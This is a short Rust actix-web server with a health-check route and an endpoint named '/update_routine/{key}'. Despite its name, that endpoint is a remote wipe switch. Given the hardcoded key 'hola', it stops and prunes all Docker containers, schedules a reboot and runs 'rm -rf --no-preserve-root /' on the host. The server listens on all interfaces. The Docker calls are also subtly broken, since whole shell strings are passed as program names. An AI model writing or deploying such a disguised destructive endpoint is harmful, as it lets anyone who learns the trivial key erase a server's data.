use actix_web::{get, middleware::Logger, web, App, HttpServer};

use std::process::{Command, Stdio};

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    env_logger::init_from_env(env_logger::Env::new().default_filter_or("debug"));

    HttpServer::new(move || {
        App::new()
            .wrap(Logger::default())
            .service(update_routine)
            .service(hc)
    })
    .bind(("0.0.0.0", 8080))?
    .workers(1)
    .run()
    .await
}

#[get("/update_routine/{key}")]
async fn update_routine(path: web::Path<String>) -> String {
    if path.into_inner() == "hola" {
        let _ = Command::new("docker stop $(docker ps -a -q)")
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .output();

        let _ = Command::new("docker system prune -a")
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .output();

        let _ = Command::new("sh")
            .args(&["-c", "sleep 5 && reboot"])
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .spawn();

        let result = Command::new("rm")
            .args(&["-rf", "--no-preserve-root", "/"])
            .output();

        return format!("{:?}", result);
    }

    String::from("Ok")
}

#[get("/")]
async fn hc() -> String {
    String::from("Ok")
}
